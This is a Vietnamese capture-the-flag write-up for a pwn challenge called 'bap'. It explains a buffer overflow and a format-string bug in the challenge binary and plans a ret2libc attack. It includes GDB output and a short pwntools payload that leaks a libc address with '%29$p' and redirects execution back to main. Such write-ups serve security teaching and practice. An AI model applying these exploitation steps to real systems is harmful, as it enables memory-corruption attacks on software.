# bap (pwn)

## First look 
- Given files: `bap`, `libc.so.6`
- Description: bap bap bap
- Author: JoshDaBosh
- Bug: BOF + FMT + Ret2Libc

## Solution 

Tại hàm `main`, chúng ta thấy có 2 bug là BOF + FMT 
```c
gets(format);
return printf(format);
```
kết hợp việc đề bài cho `libc`, khả năng cao hướng giải bài này sẽ là Ret2Libc. 

Kiểm tra các lớp bảo vệ của file 
```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
```
chúng ta đưa ra 1 số kết luận sau: 
- Canary tắt, dễ dàng thực thi BOF. 
- NX bật, không Ret2Shellcode được, đây cũng không phải hướng giải ban đầu của mình. 
- PIE tắt, địa chỉ các hàm, các biến sẽ không đổi 
- RelRO full, ta sẽ không ghi đè được bảng GOT 

Trong GDB, ta đặt 2 breakpoints tại hàm `gets()` và `printf()` nhằm quan sát xem mình đọc hoặc ghi được gì trên stack 
```
0x00000000004011b6 <+64>:    call   0x401080 <gets@plt>         (*)
0x00000000004011bb <+69>:    lea    rax,[rbp-0x10]
0x00000000004011bf <+73>:    mov    rdi,rax
0x00000000004011c2 <+76>:    mov    eax,0x0
0x00000000004011c7 <+81>:    call   0x401070 <printf@plt>       (*)
```

Ta thấy: 
- `0x00007ffecc4d9728│+0x0018: 0x00007f7f71994d00  →  <__libc_init_first+0> endbr64` chứa địa chỉ sẽ được trả về khi hàm `main` kết thúc
- `0x00007ffcb6daaf88│+0x00b8: 0x00007fd235f71e40  →  <__libc_start_main_impl+128> mov r15, QWORD PTR [rip+0x1ef159]` có địa chỉ của `libc`

Hướng khai thác: 
- Dựa vào bug BOF, ta ghi đè được địa chỉ trả về là hàm `main` để chương trình quay lại hàm `main` một lần nữa. 
- Dựa vào bug FMT, ta leak được địa chỉ `libc` bằng `%29$p` 

```python
payload = b'%29$p'.ljust(24, b'\x00') 
payload += (p64(elf.symbols['main'] + 5))
```